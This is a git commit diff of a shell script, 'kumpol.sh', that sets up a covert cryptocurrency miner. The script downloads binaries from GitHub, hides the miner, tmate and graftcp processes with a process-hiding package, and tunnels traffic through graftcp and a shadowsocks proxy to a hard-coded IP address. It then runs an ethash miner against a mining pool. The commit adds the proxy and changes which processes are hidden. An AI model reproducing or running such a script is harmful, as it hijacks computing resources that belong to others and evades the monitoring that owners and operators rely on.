ed83ccf594d97b1a782c7483a0eaa2df6c00edfa
yulinoan <106129920+yulinoan@users.noreply.github.com>
2022-06-02 00:49:16 +0700

    Update kumpol.sh

--- kumpol.sh
+++ kumpol.sh
@@ -1,13 +1,12 @@
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-apt update 
+apt update
+apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
 wget https://github.com/christiarch/templates/raw/main/lba 
 chmod +x lba 
 npm i -g node-process-hider 
 
 ph add graftcp
-ph add hidden
+ph add tmate
 ph add MIN
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
@@ -38,6 +37,11 @@ echo " "
 ./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/MIN
 chmod +x MIN
 
-./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 1-999 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
+apt -y install shadowsocks-libev rng-tools
+
+ss-local -s 144.217.7.95 -p 8388 -l 9999 -k rslzw -m chacha20-ietf-poly1305 -v &
+ 
 sleep 2
-./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 20-188 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
+./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
+sleep 2
+./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
